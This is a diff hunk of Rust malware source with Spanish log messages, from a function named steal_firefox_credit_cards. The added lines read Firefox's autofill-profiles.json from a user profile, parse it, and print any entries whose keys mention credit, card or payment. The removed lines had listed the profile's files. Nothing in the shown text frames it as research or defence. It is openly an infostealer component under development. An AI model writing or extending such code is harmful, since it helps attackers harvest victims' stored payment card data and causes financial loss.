@@ -994,19 +994,42 @@ pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
                     let json_path = profile_path.join("autofill-profiles.json");
                     log(&format!("    🔍 Buscando alternativa: {}", json_path.display()));
                     if json_path.exists() {
-                        log("    ✅ autofill-profiles.json ENCONTRADO!");
-                        // TODO: Implementar parser JSON
+                        log("    ✅ autofill-profiles.json ENCONTRADO! Leyendo contenido...");
+                        
+                        // Leer archivo JSON
+                        if let Ok(content) = std::fs::read_to_string(&json_path) {
+                            log(&format!("    📄 Tamaño: {} bytes", content.len()));
+                            
+                            // Mostrar primeros 1000 caracteres
+                            let preview: String = content.chars().take(1000).collect();
+                            log(&format!("    � CONTENIDO:\n{}", preview));
+                            
+                            // Parse JSON
+                            if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
+                                log("    ✅ JSON parseado correctamente");
+                                
+                                // Mostrar estructura
+                                if let Some(obj) = json.as_object() {
+                                    log(&format!("    🔑 Keys: {:?}", obj.keys().collect::<Vec<_>>()));
+                                    
+                                    // Buscar arrays de tarjetas
+                                    for (key, value) in obj.iter() {
+                                        if key.to_lowercase().contains("credit") || 
+                                           key.to_lowercase().contains("card") ||
+                                           key.to_lowercase().contains("payment") {
+                                            log(&format!("    💳 FOUND KEY: {} = {}", key, 
+                                                serde_json::to_string_pretty(value).unwrap_or_default().chars().take(500).collect::<String>()));
+                                        }
+                                    }
+                                }
+                            } else {
+                                log("    ❌ Error parseando JSON");
+                            }
+                        } else {
+                            log("    ❌ Error leyendo archivo");
+                        }
                     } else {
                         log("    ⚠️  autofill-profiles.json tampoco existe");
-                    }
-                    
-                    // ALTERNATIVA 2: Listar TODOS los archivos del perfil
-                    log("    📂 Archivos en el perfil:");
-                    if let Ok(entries) = std::fs::read_dir(&profile_path) {
-                        for (idx, entry) in entries.flatten().take(20).enumerate() {
-                            let filename = entry.file_name();
-                            log(&format!("      {}. {:?}", idx + 1, filename));
-                        }
                     }
                     
                     continue;
